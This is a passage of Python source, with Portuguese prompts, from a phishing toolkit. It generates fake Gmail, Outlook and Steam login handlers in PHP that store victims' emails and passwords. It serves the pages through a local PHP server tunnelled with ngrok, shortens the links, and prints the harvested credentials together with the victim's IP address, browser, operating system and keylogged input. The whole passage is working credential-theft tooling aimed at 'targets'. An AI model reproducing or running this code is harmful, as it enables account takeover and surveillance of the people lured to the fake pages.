                     os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/gmail/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/gmail/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/gmail/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/gmail/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
           else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/gmail/ip.txt")
               verificar_credenciais = os.path.exists("templates/gmail/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/gmail/ip.txt templates/gmail/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/gmail/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Gmail: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/gmail/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/gmail/ip_log.txt templates/gmail/logs > /dev/null 2>&1")
                     os.popen("cp templates/gmail/usernames.txt templates/gmail/logs > /dev/null 2>&1")
                     os.popen("touch templates/gmail/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/gmail/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/gmail/KeyloggerData.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/gmail/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/gmail/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/gmail/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/gmail/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
       else:
         banner_program()
         print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
         print ("\n" + W + "[" + R + "●" + W + "]" + C + " Servidor Ngrok Falhou" + A + R + " OFF")
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "outlook"): #Phishing Outlook
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/microsoft/login.php")
       os.system("touch templates/microsoft/login.php")
       url_destiny = open("templates/microsoft/login.php", "w")
       conteudo = ('''<?php
        include 'ip.php';
        session_start();
        $pass = $_POST["passwd"];
        $email=$_SESSION["Email"];
        file_put_contents("usernames.txt", "EMAIL: " . $email . " PASS: " . $pass . "\n", FILE_APPEND);
        header('Location: %s');
        exit();
        session_destroy();
?>''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/microsoft && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor Ngrok Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Localhost: " + G + "http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/microsoft/ip.txt")
               verificar_credenciais = os.path.exists("templates/microsoft/usernames.txt")
               verificar_keylogger = os.path.exists("templates/microsoft/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do alvo no Phishing:", hora_atual)
                 os.system("mv templates/microsoft/ip.txt templates/microsoft/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/microsoft/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/microsoft/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/microsoft/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Outlook: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/microsoft/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[8])
                     user_agent = str(conteudo_rede[10])
                     sistema_alvo = str(conteudo_rede[12])
                     versao_sistema = str(conteudo_rede[13])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/microsoft/ip_log.txt templates/microsoft/logs > /dev/null 2>&1")
                     os.popen("cp templates/microsoft/usernames.txt templates/microsoft/logs > /dev/null 2>&1")
                     os.popen("touch templates/microsoft/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/microsoft/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/microsoft/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/microsoft/KeyloggerData.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/microsoft/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/microsoft/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
           else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/microsoft/ip.txt")
               verificar_credenciais = os.path.exists("templates/microsoft/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do alvo no Phishing:", hora_atual)
                 os.system("mv templates/microsoft/ip.txt templates/microsoft/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/microsoft/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Email Outlook: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/microsoft/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[8])
                     user_agent = str(conteudo_rede[10])
                     sistema_alvo = str(conteudo_rede[12])
                     versao_sistema = str(conteudo_rede[13])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/microsoft/ip_log.txt templates/microsoft/logs > /dev/null 2>&1")
                     os.popen("cp templates/microsoft/usernames.txt templates/microsoft/logs > /dev/null 2>&1")
                     os.popen("touch templates/microsoft/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/microsoft/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/microsoft/KeyloggerData.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/microsoft/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/microsoft/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/microsoft/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/microsoft/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
       else:
         banner_program()
         print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
         print ("\n" + W + "[" + R + "●" + W + "]" + C + " Servidor Ngrok Falhou" + A + R + " OFF")
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "steam"): #Phishing Steam
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/steam/login.php")
       os.system("touch templates/steam/login.php")
       url_destiny = open("templates/steam/login.php", "w")
       conteudo = ('''<?php
include 'ip.php';

file_put_contents("usernames.txt", "[USERNAME]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: %s');
exit();''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/steam && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       banner_program()
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor Ngrok Ativo" + A + G + " OK")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Localhost: " + G + "http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/steam/ip.txt")
               verificar_credenciais = os.path.exists("templates/steam/usernames.txt")
               verificar_keylogger = os.path.exists("templates/steam/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/steam/ip.txt templates/steam/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/steam/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/steam/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/steam/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Usuário Steam: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/steam/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/steam/ip_log.txt templates/steam/logs > /dev/null 2>&1")
                     os.popen("cp templates/steam/usernames.txt templates/steam/logs > /dev/null 2>&1")
                     os.popen("touch templates/steam/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/steam/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/steam/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/steam/ip_log.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/steam/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/steam/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/steam/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/steam/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
                   time.sleep(2.5)
                   os.popen("rm templates/steam/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/steam/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/steam/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/steam/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
           else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/steam/ip.txt")
               verificar_credenciais = os.path.exists("templates/steam/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo foi fisgado no Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de login do alvo no Phishing:", hora_atual)
                 os.system("mv templates/steam/ip.txt templates/steam/ip_log.txt > /dev/null 2>&1")
                 time.sleep(1)
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" + A + G + "══════════════[ DADOS ]══════════════")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Obtidos:" + G)
                 time.sleep(1.5)
                 try:
                   arquivo_dados = open("templates/steam/usernames.txt", "r")
                   base_de_dados = arquivo_dados.read()
                   conteudo_dados = base_de_dados.split()
                   usuario = str(conteudo_dados[1])
                   senha = str(conteudo_dados[3])
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Usuário Steam: " + G + "%s" %usuario)
                   print ("\n" + W + "[" + G + "+" + W + "]" + A + " Senha: " + G + "%s" %senha)
                   arquivo_dados.close()
                   time.sleep(1.2)
                   try:
                     arquivo_rede = open("templates/steam/ip_log.txt", "r")
                     dados_de_rede = arquivo_rede.read()
                     conteudo_rede = dados_de_rede.split()
                     endereco_ip = str(conteudo_rede[1])
                     user_agent = str(conteudo_rede[3])
                     sistema_alvo = str(conteudo_rede[5])
                     versao_sistema = str(conteudo_rede[6])
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Endereço IP: " + G + "%s" %endereco_ip)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Navegador: " + G + "%s" %user_agent)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                     print ("\n" + W + "[" + G + "+" + W + "]" + A + " Versão do Sistema: " + G + "%s" %versao_sistema)
                     arquivo_rede.close()
                     print ("\n" + A + G + "═════════════════════════════════════")
                     os.popen("cp templates/steam/ip_log.txt templates/steam/logs > /dev/null 2>&1")
                     os.popen("cp templates/steam/usernames.txt templates/steam/logs > /dev/null 2>&1")
                     os.popen("touch templates/steam/logs/Data.txt > /dev/null 2>&1")
                     os.popen("(date +'%x => %X') > templates/steam/logs/Data.txt")
                     time.sleep(0.5)
                     os.popen("rm templates/steam/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/steam/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/steam/KeyloggerData.txt > /dev/null 2>&1")
                     stop()
                     break
                   except FileNotFoundError:
                     print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível processar os dados de Rede.")
                     os.popen("rm templates/steam/usernames.txt > /dev/null 2>&1")
                     os.popen("rm templates/steam/ip.txt > /dev/null 2>&1")
                     os.popen("rm templates/steam/ip_log.txt > /dev/null 2>&1")
                     os.system("rm templates/steam/KeyloggerData.txt > /dev/null 2>&1")
                     print ("\n" + A + G + "═════════════════════════════════════")
                     time.sleep(2.5)
                     stop()
                 except IndexError:
                   print ("\n" + W + "[" + R + "-" + W + "]" + C + " O alvo não digitou os dados no Phishing.")
